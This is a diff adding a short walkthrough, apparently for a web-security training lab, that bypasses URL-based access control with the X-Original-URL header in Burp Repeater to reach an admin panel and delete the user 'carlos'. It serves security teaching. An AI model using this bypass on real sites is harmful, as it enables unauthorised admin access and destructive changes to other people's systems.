@@ -1,0 +1,23 @@
+Steps:
+
+1. Attempt to access the admin panel:
+   /admin
+   Verify that access is blocked.
+2. Send the request to Burp Repeater.
+3. Modify the request as follows:
+   - Change the request path to:
+     /
+   - Add the following header:
+     X-Original-URL: /invalid
+4. Resend the request and confirm that the backend processes the value of the X-Original-URL header.
+5. Change the header value to:
+   X-Original-URL: /admin
+6. Resend the request to access the admin panel.
+7. To delete the target user:
+   - Set the request path to:
+     /
+   - Add the query string:
+     ?username=carlos
+   - Update the header to:
+     X-Original-URL: /admin/delete
+8. Send the request to delete carlos and complete the lab.
